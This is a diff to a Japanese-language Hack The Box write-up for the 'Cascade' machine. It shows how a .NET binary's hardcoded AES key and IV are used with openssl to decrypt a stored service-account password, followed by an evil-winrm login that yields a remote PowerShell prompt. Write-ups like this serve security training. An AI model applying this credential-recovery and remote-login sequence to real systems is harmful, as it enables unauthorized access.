@@ -657,11 +657,29 @@ CascAudit.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 Mono/.N
 `using CascCrypto`からCascAudit.exeの実行に`CascCrypto.dll`が必要であることを確認  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_02.png">  
 ダウンロードしたディレクトリごとオープン  
-パスワード復号処理をしているっぽいCrypto.DecryptStringを発見
+指定されたdbファイル内のldapテーブルのpwd列の文字列を復号処理をしているっぽいCrypto.DecryptStringを発見
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_03.png">  
+Crypto.DecryptString関数は初めにbase64デコードしたのちに、128ビットAESで復号化している  
+utf8形式のkeyとivを取得できたので実際に復号実施！
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_04.png">  
+opensslで復号成功！
 ```sh
 └─$ echo 'BQO5l5Kj9MdErXx6Q6AGOw==' | openssl enc -aes-128-cbc -d -base64 -K $(echo -n 'c4scadek3y654321' | xxd -p) -iv $(echo -n '1tdyjCbY1Ix49842'| xxd -p )
 w3lc0meFr31nd
 ```
+STEP2で確認した通り、arksvcは「Remote Management Users」のメンバーであったためwinrmでログイン成功！
+```powershell
+└─$ evil-winrm -i 110.129.188.71 -u arksvc -p w3lc0meFr31nd
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\arksvc\Documents>
+```
 
+
+## STEP 6
